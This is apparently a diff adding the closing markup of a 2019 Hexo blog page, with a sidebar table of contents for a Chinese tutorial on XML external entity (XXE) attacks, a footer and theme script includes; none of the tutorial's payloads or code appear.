+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML简介"><span class="nav-number">2.</span> <span class="nav-text">XML简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XML常见应用"><span class="nav-number">2.1.</span> <span class="nav-text">XML常见应用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML基本语法"><span class="nav-number">2.2.</span> <span class="nav-text">XML基本语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xml实体"><span class="nav-number">2.3.</span> <span class="nav-text">xml实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD简介"><span class="nav-number">2.4.</span> <span class="nav-text">DTD简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#内部的-DOCTYPE-声明"><span class="nav-number">2.4.1.</span> <span class="nav-text">内部的 DOCTYPE 声明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#外部文档声明"><span class="nav-number">2.4.2.</span> <span class="nav-text">外部文档声明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DTD定义实体"><span class="nav-number">2.4.3.</span> <span class="nav-text">DTD定义实体</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE简介"><span class="nav-number">3.</span> <span class="nav-text">XXE简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#进行一个最简单的测试"><span class="nav-number">3.0.1.</span> <span class="nav-text">进行一个最简单的测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#来个特殊点的情况"><span class="nav-number">3.0.2.</span> <span class="nav-text">来个特殊点的情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参数实体"><span class="nav-number">3.0.3.</span> <span class="nav-text">参数实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#无回显读取本地敏感文件-Blind-OOB-XXE"><span class="nav-number">3.0.4.</span> <span class="nav-text">无回显读取本地敏感文件(Blind OOB XXE)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内网主机探测"><span class="nav-number">3.0.5.</span> <span class="nav-text">内网主机探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内网主机端口扫描"><span class="nav-number">3.0.6.</span> <span class="nav-text">内网主机端口扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java当中的利用"><span class="nav-number">3.1.</span> <span class="nav-text">java当中的利用</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">R1dd1er</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
